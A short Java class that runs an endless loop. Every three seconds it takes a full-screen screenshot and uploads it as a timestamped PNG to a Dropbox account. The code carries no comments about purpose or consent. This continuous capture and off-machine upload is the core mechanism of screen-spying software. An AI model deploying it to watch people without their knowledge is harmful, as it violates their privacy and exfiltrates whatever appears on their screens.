import com.dropbox.core.v2.DbxClientV2;
import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.concurrent.TimeUnit;


public class MyThread extends Thread {

    private DbxClientV2 client1;

    public MyThread(DbxClientV2 client) {
        client1 = client;
    }

    @Override
    public void run() {
        for (; ; ) {
            BufferedImage image = null;
            try {
                image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
            } catch (AWTException e) {
                e.printStackTrace();
            }
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            try {
                ImageIO.write(image, "png", baos);
            } catch (IOException e) {
                e.printStackTrace();
            }
            byte[] imageInByte = baos.toByteArray();

            SimpleDateFormat formatter = new SimpleDateFormat("yyyyMMdd_HHmmss");
            Date now = new Date();

            //System.out.println(formatter.format(now));

            try {
                InputStream in = new ByteArrayInputStream(imageInByte);
                client1.files().uploadBuilder("/" + formatter.format(now) + ".png")
                        .uploadAndFinish(in);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
            try {
                TimeUnit.SECONDS.sleep(3);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}
